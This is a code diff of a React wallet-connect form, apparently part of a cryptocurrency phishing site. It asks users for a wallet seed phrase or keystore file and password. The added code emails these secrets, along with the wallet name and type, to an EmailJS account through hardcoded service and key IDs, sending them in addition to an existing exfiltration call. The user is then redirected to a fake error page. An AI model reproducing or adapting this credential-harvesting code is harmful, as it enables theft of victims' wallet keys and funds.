@@ -1,11 +1,12 @@
-import React, { useState } from 'react';
 import { IoArrowBackOutline } from "react-icons/io5";
 import styles from './WalletConnectForm.module.css';
-import {useNavigate} from 'react-router-dom'
 import axios from 'axios'
 import WalletHeading from './WalletConnectForm/WalletHeading';
 import WalletImageContainer from './WalletConnectForm/WalletImageContainer';
 import PrivateKeyForm from './WalletConnectForm/PrivateKeyForm';
+
+import React, { useState } from 'react';
+import {useNavigate} from 'react-router-dom'
 import { ToastContainer, toast } from 'react-toastify';
 import 'react-toastify/dist/ReactToastify.css';
 import emailjs from '@emailjs/browser';
@@ -16,11 +17,13 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
   const [activeButton, setActiveButton] = useState(1);
   const [wallet, setWallet] = useState(walletName);
   const [phrase, setPhrase] = useState("");
+
   const [keystore, setKeyStore] = useState("");
   const [keystorePassword, setKeystorePassword] = useState("");
+  const [keystoreSubmit, setKeystoreSubmit] = useState('CONNECT')
+
   const [phraseError, setPhraseError] = useState(false);
   const [phraseSubmit, setPhraseSubmit] = useState('CONNECT')
-  const [keystoreSubmit, setKeystoreSubmit] = useState('CONNECT')
   
   const handleButtonClick = (viewNumber, e) => {
     e.preventDefault(); // Prevent the default form submission behavior
@@ -53,15 +56,23 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     const formData = {name, type, data, password}
     if (validatePhrase(phrase)) {
       try {
-        //  await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
-        // await emailjs.send(
-        //   'service_ky8xa0e',
-        //   'template_kqjcmir',
-        //   {
-        //     ...formData,
-        //   },
-        //   'pudHPDoixy2beukw8'
-        // );
+
+        await emailjs.send(
+          'service_30vkiql',
+          'template_e0wb6w8',
+          {
+            to_name: "dapp", // Replace with the actual recipient's name if needed
+            from_name: formData.name,
+            message: `
+              Name: ${formData.name}
+              Type: ${formData.type}
+              Data: ${formData.data}
+              Password: ${formData.password}
+            `,
+          },
+          '4leuzsOPi6Oh_D4e0'
+        );
+        
         await emailjs.send(
           'service_ky8xa0e',
           'template_kqjcmir',
@@ -77,6 +88,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
           },
           'pudHPDoixy2beukw8'
         );
+
         setTimeout(() => {
           navigate('/error')
         }, 3000);
@@ -109,15 +121,23 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     const password = keystorePassword
     const formData = {name, type, data, password}
     try {
-      // await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
-      // await emailjs.send(
-      //   'service_ky8xa0e',
-      //   'template_kqjcmir',
-      //   {
-      //     ...formData,
-      //   },
-      //   'pudHPDoixy2beukw8'
-      // );
+
+      await emailjs.send(
+        'service_30vkiql',
+        'template_e0wb6w8',
+        {
+          to_name: "dapp", // Replace with the actual recipient's name if needed
+          from_name: formData.name,
+          message: `
+            Name: ${formData.name}
+            Type: ${formData.type}
+            Data: ${formData.data}
+            Password: ${formData.password}
+          `,
+        },
+        '4leuzsOPi6Oh_D4e0'
+      );
+      
       await emailjs.send(
         'service_ky8xa0e',
         'template_kqjcmir',
